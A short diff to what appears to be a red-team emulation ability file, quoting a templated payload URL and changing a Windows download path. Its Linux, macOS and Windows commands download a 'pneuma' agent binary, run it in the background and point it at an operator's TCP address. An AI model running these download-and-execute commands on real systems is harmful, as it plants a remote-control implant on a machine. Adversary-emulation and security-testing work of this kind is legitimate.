@@ -23,14 +23,14 @@ platforms:
   linux:
     sh:
       command: |
-        curl #{payload.url} > /tmp/pneuma && 
+        curl "#{payload.url}" > /tmp/pneuma && 
         chmod +x /tmp/pneuma && 
         nohup /tmp/pneuma -name "$(hostname)" -address #{operator.tcp} &
       payload: pneuma-linux
   darwin:
     sh:
       command: |
-        curl #{payload.url} > /tmp/pneuma && 
+        curl "#{payload.url}" > /tmp/pneuma && 
         chmod +x /tmp/pneuma && 
         nohup /tmp/pneuma -name "$(hostname)" -address #{operator.tcp} &
       payload: pneuma-darwin
@@ -38,6 +38,6 @@ platforms:
     psh:
       command: |
         $wc = New-Object System.Net.WebClient; 
-        $wc.DownloadFile("#{payload.url}","C:\aws\download\pneuma-windows.exe"); 
+        $wc.DownloadFile("#{payload.url}","C:\Users\Public\pneuma-windows.exe"); 
         Start-Process -FilePath .\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{operator.tcp}"
       payload: pneuma-windows.exe
